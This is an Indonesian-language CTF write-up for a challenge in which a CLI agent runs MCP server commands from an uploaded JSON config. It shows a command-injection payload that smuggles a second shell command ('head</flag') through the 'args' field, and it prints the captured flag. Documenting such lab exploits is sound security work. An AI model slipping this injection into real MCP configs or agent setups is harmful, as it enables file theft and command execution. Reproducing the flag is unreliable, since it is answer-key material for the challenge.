# Tea-agent

Target ini kelihatan seperti CLI agent yang bisa upload MCP config. Menu `upload MCP config` menerima JSON, lalu agent menjalankan command MCP dari config itu.

## Recon

Config contoh di `sample_configs/benign.json` cuma menjalankan:

```json
{
  "mcpServers": {
    "memory": {
      "command": "/app/mcp_memory",
      "args": ["--profile=guest","--topic=welcome","--once"]
    }
  }
}
```

Saat diuji ke remote, `mcp_memory` memang dijalankan dan output tool list muncul. Masalahnya bukan di MCP server, tapi di cara agent membangun command dari `args`.

## Temuan

Field `args` tidak dipassing secara aman. Karakter shell tertentu tetap hidup di argumen. Ini kelihatan dari beberapa percobaan:

- `>` mengarah ke redirection.
- `#` memotong sisa command.
- `;` bisa dipakai untuk lanjut command baru.

Payload paling pendek yang valid:

```json
{
  "mcpServers": {
    "memory": {
      "command": "/app/mcp_memory",
      "args": ["--profile=guest;head</flag"]
    }
  }
}
```

`head` baca dari stdin kalau tidak dikasih file, jadi `head</flag` cukup untuk dump isi file flag tanpa butuh spasi.

## Exploit

Upload config di atas lewat menu `2`, lalu agent menjalankan:

```sh
/app/mcp_memory --profile=guest;head</flag
```

Command pertama jalan normal, lalu `head` baca `/flag` dan output flag langsung muncul di stdout MCP process.

## Flag

`NHNC{N0_W4y_Y0u_pwn_m1ne_4gent_Y0r_are_th3_G0d_0f_4gent_S3curity_9bc56aae72cd475c8adc3c54c77c324e}`
